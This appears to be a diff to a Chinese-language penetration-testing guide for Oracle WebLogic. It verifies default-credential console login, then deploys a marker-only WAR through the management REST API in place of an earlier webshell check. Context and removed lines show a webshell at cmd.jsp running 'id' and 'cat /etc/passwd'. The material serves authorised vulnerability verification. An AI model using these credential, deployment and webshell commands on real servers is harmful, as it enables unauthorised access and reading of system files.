@@ -137,22 +137,29 @@ curl -s "http://target:7001/webshell/cmd.jsp?cmd=cat+/etc/passwd"
 ## 验证方法
 
 ```bash
-# 方法1: 弱口令验证 - 检查登录是否成功
-curl -s -c cookies.txt -L \
+# 1) 弱口令：登录后取到登录态，而不是只看跳转
+curl -s -c cookies.txt \
   -d "j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8" \
-  "http://target:7001/console/j_security_check" \
-  -w "\n%{http_code} %{redirect_url}" | tail -1
-# 登录成功返回 302 且跳转到 /console/console.portal
+  "http://target:7001/console/j_security_check" -o /dev/null
+grep -i "JSESSIONID\|ADMINCONSOLESESSION" cookies.txt
+# 判据：登录接口返回了 WebLogic 的会话 cookie（ADMINCONSOLESESSION / JSESSIONID），且带着它请求控制台能拿到后台框架页
+# 反例：302 到 console.portal 也可能是跳回登录页；cookie 文件为空或只有 j_security_check 的失败重定向，都算没登录进去
 
-# 方法2: webshell 部署后验证
-curl -s "http://target:7001/webshell/cmd.jsp?cmd=id" | grep "uid="
-# 返回类似 uid=1000(oracle) gid=1000(oracle) 说明利用成功
+# 2) 无损落地验证：不解 shell，先传一个只有标记的文本文件，再 GET 回读
+mkdir -p poc && echo "POC_TOKEN" > poc/poc.txt
+cd poc && jar -cf ../poc.war poc.txt && cd ..
+curl -s -b cookies.txt -H "X-Requested-By: weblogic" \
+  -F "model={name:'poc',targets:[{identity:[servers,'AdminServer']}]}" \
+  -F "sourcePath=@poc.war" \
+  "http://target:7001/management/wls/latest/deployments/application"
+curl -s "http://target:7001/poc/poc.txt"
+# 判据：GET 回读到的响应体就是本次上传的 POC_TOKEN，说明部署链路可写、可访问
+# 清理：控制台 undeploy 该应用，或走 REST 删除 /management/wls/latest/deployments/application/poc
+# 反例：回读到 404/403，或只拿到部署状态 JSON（那只证明接口收下请求，不证明文件可达）
 
-# 方法3: 检查部署状态
-curl -s -b cookies.txt \
-  -H "X-Requested-By: weblogic" \
-  -H "Accept: application/json" \
-  "http://target:7001/management/wls/latest/deployments/application" | grep "webshell"
+# 3) 确认部署记录里确实有本次应用
+curl -s -b cookies.txt -H "X-Requested-By: weblogic" -H "Accept: application/json" \
+  "http://target:7001/management/wls/latest/deployments/application" | grep -o '"name":"poc"'
 ```
 
 ## 指纹确认
